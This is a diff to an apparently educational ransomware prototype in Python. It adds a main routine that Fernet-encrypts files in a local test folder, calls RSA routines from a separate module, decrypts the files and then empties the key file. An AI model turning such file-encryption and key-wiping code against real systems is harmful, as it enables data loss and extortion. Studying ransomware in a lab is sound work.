@@ -4,6 +4,7 @@ from cryptography.fernet import Fernet
 
 from os import listdir
 from os.path import isfile, join
+import tsetrsa
 
 
 mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
@@ -66,5 +67,18 @@ def decrypt():
             dec_file.write(decrypted)
 
 
-encrypt_files()
-decrypt()
+def empty_keychain():
+        with open(keychain_path, 'wb') as keychain:
+            keychain.write(b"")
+            
+
+def main():
+     encrypt_files()
+     tsetrsa.encrypt_rsa()
+     tsetrsa.decrypt_rsa()
+     decrypt()
+     empty_keychain() 
+
+
+if __name__=="__main__":
+    main()
